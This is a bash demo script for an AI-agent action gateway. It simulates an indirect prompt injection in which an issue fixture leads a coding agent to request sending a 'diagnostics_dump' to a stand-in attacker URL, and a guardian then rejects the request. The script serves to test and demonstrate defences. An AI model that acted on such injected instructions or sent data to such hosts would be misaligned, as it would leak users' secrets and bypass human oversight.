#!/usr/bin/env bash
# ==============================================================================
# Scenario 3: Prompt Injection Attempt (Blocked)
#
# Demonstrates an indirect prompt injection attack attempting to coerce the AI agent
# into exfiltrating secrets. The gateway flags risk signals, guardians inspect and
# reject the request, and no sensitive data reaches the external server.
# ==============================================================================
set -euo pipefail

GATEWAY_URL="${GATEWAY_URL:-http://localhost:3001}"
FAKE_EXT_URL="${FAKE_EXTERNAL_URL:-http://localhost:4002}"

GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}====================================================================${NC}"
echo -e "${BLUE}Scenario 3: Prompt Injection Defense${NC}"
echo -e "${BLUE}====================================================================${NC}"

echo -e "\n${YELLOW}Step 1: Inspect malicious fixture (Indirect Prompt Injection)${NC}"
echo "Viewing mock-env/fixtures/malicious-issue.md..."
grep -A 10 "ATTACKER PROMPT INJECTION PAYLOAD" mock-env/fixtures/malicious-issue.md || true

echo -e "\n${YELLOW}Step 2: Compromised agent attempts to call request_send_external${NC}"
CREATE_RES=$(curl -s -X POST "${GATEWAY_URL}/actions" \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "request_send_external",
    "parameters": {
      "destination": "http://evil.attacker-controlled-site.org/collect",
      "payload_ref": "diagnostics_dump"
    },
    "proposer": {
      "userId": "injected-agent",
      "agent": "Claude-Code-Agent-v1"
    },
    "source": {
      "kind": "issue",
      "reference": "mock-env/fixtures/malicious-issue.md"
    }
  }' || echo "")

if [ -z "$CREATE_RES" ] || ! echo "$CREATE_RES" | grep -q '"id"'; then
  echo -e "${RED}Error: Could not reach gateway at ${GATEWAY_URL}.${NC}"
  exit 1
fi

ACTION_ID=$(echo "$CREATE_RES" | grep -o '"id":"[^"]*' | cut -d'"' -f4)
RISK_FLAGS=$(echo "$CREATE_RES" | grep -o '"riskSignals":\[[^]]*\]' || echo "")
echo "Action Request Created: ${ACTION_ID}"
echo "Risk Flags Triggered by Gateway: ${RISK_FLAGS}"

echo -e "\n${YELLOW}Step 3: Guardian inspects flags on UI dashboard and REJECTS action${NC}"
REJECT_RES=$(curl -s -X POST "${GATEWAY_URL}/actions/${ACTION_ID}/reject" \
  -H "Content-Type: application/json" \
  -d '{
    "guardianId": "guardian-alice",
    "reason": "Prompt injection detected: unauthorized external destination domain"
  }')

STATUS=$(echo "$REJECT_RES" | grep -o '"status":"[^"]*' | cut -d'"' -f4)
echo "After Guardian Rejection: Status is ${STATUS}"

echo -e "\n${YELLOW}Step 4: Verify fake-external server received NO data${NC}"
if curl -s -f "${FAKE_EXT_URL}/logs" > /dev/null 2>&1; then
  LOGS=$(curl -s "${FAKE_EXT_URL}/logs")
  echo "Fake-external received payloads: ${LOGS}"
else
  echo "Fake-external server received 0 payloads."
fi

echo -e "\n${GREEN}✔ Scenario 3 complete: Prompt injection thwarted by deterministic risk rules and guardian rejection.${NC}"
